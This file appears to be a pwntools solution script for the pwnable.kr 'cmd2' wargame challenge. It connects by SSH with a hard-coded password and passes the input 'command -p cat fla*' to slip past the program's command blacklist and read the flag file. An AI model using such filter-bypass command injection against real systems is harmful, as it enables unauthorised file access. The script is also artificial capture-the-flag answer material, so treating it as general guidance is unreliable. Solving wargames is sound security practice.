from pwn import *
#context.log_level='debug'

s = ssh('cmd2','pwnable.kr',port=2222,password='mommy now I get what PATH environment is for :)')

payload = ''
payload += 'command -p cat fla*'

p = s.process(executable='./cmd2',argv=['cmd2',payload])
p.interactive()
